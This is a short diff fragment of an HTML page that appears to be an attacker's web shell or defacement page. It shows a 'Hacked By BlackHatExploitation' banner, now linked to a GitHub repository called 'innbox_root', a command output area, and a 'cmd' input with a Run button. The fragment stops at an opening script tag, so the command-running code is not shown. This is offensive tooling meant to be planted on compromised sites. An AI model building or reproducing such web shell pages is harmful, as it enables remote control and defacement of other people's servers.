@@ -64,7 +64,7 @@ h2{color:#f00}
 #b{background:#0f0;color:#000;padding:8px 15px;border:none}
 </style></head>
 <body>
-<h2>HACKED BY BlackHatExploitation</h2>
+<h2>Hacked By <a href="https://github.com/BlackHatExploitation/innbox_root" target="_blank" style="color:#f00;text-decoration:none">BlackHatExploitation</a></h2>
 <div id="t"><div id="o"></div></div>
 <input id="i" placeholder="cmd"><button id="b">Run</button>
 <script>
